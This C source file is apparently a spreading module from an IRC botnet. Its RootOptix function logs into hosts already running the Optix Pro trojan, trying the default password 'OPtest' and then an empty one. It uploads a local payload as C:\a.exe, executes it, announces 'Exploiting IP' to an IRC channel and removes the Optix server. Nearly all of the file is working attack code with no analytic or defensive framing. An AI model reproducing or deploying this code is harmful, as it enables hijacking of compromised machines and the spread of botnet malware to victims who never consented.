#include "includes.h"
#include "functions.h"
#include "externs.h"

//Root Optix, All-Versions, All Hail D-oNe! :P
BOOL RootOptix(EXINFO exinfo)
{
	char buffer[IRCLINE];
	WSADATA opxdata;
	SOCKET opxsock;
	struct sockaddr_in opxinfo;
	char szBuffer[64];
	char szFilePath[MAX_PATH];
	if (fWSAStartup(MAKEWORD(2,2), &opxdata) != 0) return FALSE;
//Connect To Optix Main Port
		opxinfo.sin_addr.s_addr = finet_addr(exinfo.ip);
		opxinfo.sin_port = fhtons(exinfo.port);		
		opxinfo.sin_family = AF_INET;
		opxsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(opxsock, (struct sockaddr *)&opxinfo, sizeof(opxinfo)) == SOCKET_ERROR) 
	{
			fclosesocket(opxsock);
			return FALSE;
	}
//Auth
//Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
		sprintf(szBuffer, "022¬OPtest¬v1.2\r\n"); //OPtest = Default Password
		fsend(opxsock, szBuffer, strlen(szBuffer), 0);
		Sleep(500);
		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strstr(szBuffer, "001¬") == NULL) //001 Should Be The Same On All Versions, Therefore strstr();
	{
			Sleep(500);
//If "OPtest" Dont Work, Try NULL Password
			sprintf(szBuffer, "022¬¬v1.2\r\n"); //NULL Password
			fsend(opxsock, szBuffer, strlen(szBuffer), 0);
			Sleep(500);
			memset(szBuffer, 0, sizeof(szBuffer));
			frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strstr(szBuffer, "001¬") == NULL) //001 Should Be The Same On All Versions, Therefore strstr();
		{
				fclosesocket(opxsock);
				return FALSE;
		}
	}
//Prepare Optix For Upload
		fsend(opxsock, "019¬\r\n", 6, 0);
		Sleep(500);
		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strcmp(szBuffer, "020¬\r\n") != 0)
	{
			fclosesocket(opxsock);
			return FALSE;
	}
	FILE *f;
	DWORD dwSize;
	HANDLE hFile;
	int read = 0;
	WSADATA upldata;
	SOCKET uplsock;
	struct sockaddr_in uplinfo;
//Get FilePath
//		memset(szFilePath, 0, sizeof(szFilePath));
//		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
		sprintf(szFilePath, szLocalPayloadFile);
//Open File
		f = fopen(szFilePath, "rb");
	if (f == NULL)
	{	
			fclosesocket(opxsock);
			return FALSE;
	}
//Connect To Upload Socket..
	if (fWSAStartup(MAKEWORD(2,2), &upldata) != 0)
	{
			fclosesocket(opxsock);
			return FALSE;
	}		
		uplinfo.sin_addr.s_addr = finet_addr(exinfo.ip);
		uplinfo.sin_port = fhtons(500);		
		uplinfo.sin_family = AF_INET;
		uplsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(uplsock, (struct sockaddr *)&uplinfo, sizeof(uplinfo)) == SOCKET_ERROR)
	{
			fclosesocket(uplsock);
			fclosesocket(opxsock);
			return FALSE;
	}	
//Send File Info (Where To Upload And Size..)
		hFile = CreateFile(szFilePath, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		dwSize = GetFileSize(hFile, 0);
		CloseHandle(hFile);
		memset(szBuffer, 0, sizeof(szBuffer));
		sprintf(szBuffer, "C:\\a.exe\r\n%d\r\n", dwSize);
		fsend(uplsock, szBuffer, strlen(szBuffer), 0);
		Sleep(500);
		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(uplsock, szBuffer, sizeof(szBuffer), 0);
//OK REDY Received, Upload File..
	if (strstr(szBuffer, "+OK REDY") == NULL) 
	{
			fclosesocket(uplsock);
			fclosesocket(opxsock);
			return FALSE;
	}
//Notify IRC That We Are Exploiting..
		_snprintf(buffer, sizeof(buffer), "[OptixPro]: Exploiting IP: [%s]", exinfo.ip);
		irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
//Upload \o/
		memset(szBuffer, 0, sizeof(szBuffer));
	while (!feof(f)) 
	{
			read = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
			fsend(uplsock, szBuffer, read, 0);
	}
		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(uplsock, szBuffer, sizeof(szBuffer), 0);
//Execute File If Upload Success
	if (strstr(szBuffer, "+OK RCVD") != NULL)
	{
			fclosesocket(uplsock);
			fsend(opxsock, "008¬C:\\a.exe\r\n", 14, 0);
			Sleep(500);
			memset(szBuffer, 0, sizeof(szBuffer));
			frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strcmp(szBuffer, "001¬Error Executing File\r\n") == 0)
		{
				fclosesocket(uplsock);
				fclosesocket(opxsock);
				return FALSE;
		}
	}
	else
	{
			fclosesocket(uplsock);
			fclosesocket(opxsock);
			return FALSE;
	}		
//Remove Optix Server
		fsend(opxsock, "100¬\r\n", 6, 0);
		fclosesocket(uplsock);
		fclosesocket(opxsock);
		return TRUE;
}
